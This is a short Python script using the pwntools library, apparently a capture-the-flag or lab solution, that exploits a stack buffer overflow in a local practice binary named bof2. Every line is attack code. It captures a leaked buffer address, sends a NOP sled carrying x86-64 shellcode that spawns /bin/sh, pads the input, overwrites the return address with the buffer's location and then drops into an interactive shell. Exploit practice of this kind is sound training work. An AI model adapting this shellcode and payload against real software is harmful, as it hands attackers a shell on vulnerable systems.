from pwn import *

shellcode = b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"

p = process("./bof2")
gdb.attach(p) # debug

p.recvuntil(b" @ ")
buf_addr = int(p.recvline().strip(), 0x10)
log.info(f"buf_addr @ {buf_addr:#x}")

payload = b""
payload += b"\x90" * 0x20
payload += shellcode
# payload += payload.ljust(520, b"\x90")

payload += (0x208 - len(payload)) * b"\x90"
payload += p64(buf_addr)

p.send(payload)
p.interactive()
